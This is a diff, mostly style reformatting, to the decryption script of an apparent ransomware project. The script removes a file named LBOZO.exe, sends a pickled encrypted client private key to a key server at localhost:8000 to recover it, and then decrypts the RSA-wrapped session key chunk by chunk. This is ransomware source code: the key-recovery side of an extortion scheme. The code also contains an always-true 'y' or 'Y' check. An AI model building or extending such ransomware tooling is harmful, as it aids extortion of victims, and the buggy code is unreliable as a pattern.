@@ -4,13 +4,21 @@ import sys
 import os
 import pickle
 import requests
+
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 from utils import *
-from utils import ransomware_path, encrypted_client_private_key_path, client_public_key_path, ransomware_path
+from utils import (
+    ransomware_path,
+    encrypted_client_private_key_path,
+    client_public_key_path,
+    ransomware_path,
+)
+
 if os.path.exists(ransomware_path + "\\LBOZO.exe"):
     os.remove(ransomware_path + "\\LBOZO.exe")
 
-server_address = ("http://localhost:8000/decryptkey/")
+server_address = "http://localhost:8000/decryptkey/"
+
 
 def send_to_server_encrypted_private_key(private_encrypted_key):
     try:
@@ -23,22 +31,24 @@ def send_to_server_encrypted_private_key(private_encrypted_key):
     private_key = ret.text
     return str(private_key)
 
+
 decryptend = input("Decrypt? (y/n): ")
 if decryptend == "y" or "Y":
 
-    with open(encrypted_client_private_key_path, 'rb') as f:
+    with open(encrypted_client_private_key_path, "rb") as f:
         encrypted_client_private_key = pickle.load(f)
-        client_private_key = send_to_server_encrypted_private_key(encrypted_client_private_key)
+        client_private_key = send_to_server_encrypted_private_key(
+            encrypted_client_private_key
+        )
 
-
-    with open(ransomware_path + "\\session_key.txt", 'rb') as f:
+    with open(ransomware_path + "\\session_key.txt", "rb") as f:
         enc_session_key = f.read()
 
     private_key = RSA.import_key(client_private_key)
     cipher_rsa = PKCS1_OAEP.new(private_key)
 
-    n = 256 # chunk length
-    chunks = [enc_session_key[i:i+n] for i in range(0, len(enc_session_key), n)]
+    n = 256  # chunk length
+    chunks = [enc_session_key[i : i + n] for i in range(0, len(enc_session_key), n)]
     final_session_decrypted = b""
     for i in chunks:
         session_key = cipher_rsa.decrypt(i)
